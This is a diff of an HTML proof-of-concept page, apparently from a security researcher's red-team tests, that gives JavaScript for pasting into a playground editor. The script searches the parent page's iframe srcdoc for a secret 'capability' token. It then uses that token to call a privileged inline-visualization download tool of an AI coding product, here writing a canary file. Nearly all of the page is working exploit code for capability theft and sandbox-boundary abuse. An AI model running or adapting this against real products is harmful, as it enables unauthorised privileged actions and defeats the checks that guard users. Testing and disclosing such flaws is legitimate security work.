@@ -1,37 +1,39 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>T38 clean copy page</title></head>
+<head><meta charset="utf-8"><title>T38b clean copy page</title></head>
 <body style="font-family:monospace;background:#111;color:#ccc;padding:20px">
-<h2 style="color:#f33">T38 CLEAN COPY PAGE — click Copy, then paste into the playground editor</h2>
+<h2 style="color:#f33">T38b CLEAN COPY PAGE — click Copy, then paste into the playground editor</h2>
 <button id="copy" style="font-size:18px;padding:10px 20px">Copy code</button>
 <pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">(function () {
   function log(m) { try { console.log(m); } catch (e) {} }
   function desc(e) {
     try { return String(e && e.message ? e.message : "") + " | " + JSON.stringify(e); } catch (x) { return String(e); }
   }
-  log("T38 capability extraction " + Date.now());
+  log("T38b srcdoc capability " + Date.now());
   var cap = null;
   try {
-    var ss = document.querySelectorAll("script");
-    for (var i = 0; i < ss.length; i++) {
-      var t = ss[i].textContent || "";
-      var m = t.match(/capability\s*=\s*"([^"]+)"/);
-      if (m) { cap = m[1]; log("capability found in script " + i + " length " + cap.length); break; }
+    var fr = window.parent.document.querySelectorAll("iframe");
+    log("parent frames: " + fr.length);
+    for (var i = 0; i < fr.length; i++) {
+      var sd = fr[i].getAttribute("srcdoc") || "";
+      if (!sd) continue;
+      log("frame " + i + " srcdoc length " + sd.length);
+      var m = sd.match(/capability\s*=\s*"([^"]+)"/);
+      if (m) { cap = m[1]; log("capability found in frame " + i + " length " + cap.length); break; }
     }
-    if (!cap) log("no capability string found");
-  } catch (e) { log("extract ERR: " + e.message); }
-  if (!cap) { log("T38 stops - nothing to call with"); return; }
+  } catch (e) { log("srcdoc ERR: " + e.message); }
+  if (!cap) { log("no capability in srcdoc - T38b stops"); return; }
   setTimeout(function () {
     var api = window.oai || window.openai || window.webplus;
     if (!api) { log("no api"); return; }
-    var blob = new Blob(["T38 canary - direct capability call - Pluto Security research, harmless " + Date.now()], { type: "text/plain" });
+    var blob = new Blob(["T38b canary - srcdoc capability direct call - Pluto Security research, harmless " + Date.now()], { type: "text/plain" });
     try {
-      api.callTool("__codex_inline_visualization_download__", { blob: blob, capability: cap, name: "CANARY-T38-direct-capability.txt" }).then(
+      api.callTool("__codex_inline_visualization_download__", { blob: blob, capability: cap, name: "CANARY-T38b-srcdoc-capability.txt" }).then(
         function (v) { log("download RESOLVED: " + JSON.stringify(v)); },
         function (e) { log("download REJECTED: " + desc(e)); }
       );
     } catch (e) { log("sync ERR: " + desc(e)); }
-    log("T38 done");
+    log("T38b done");
   }, 500);
 })();
 </pre>
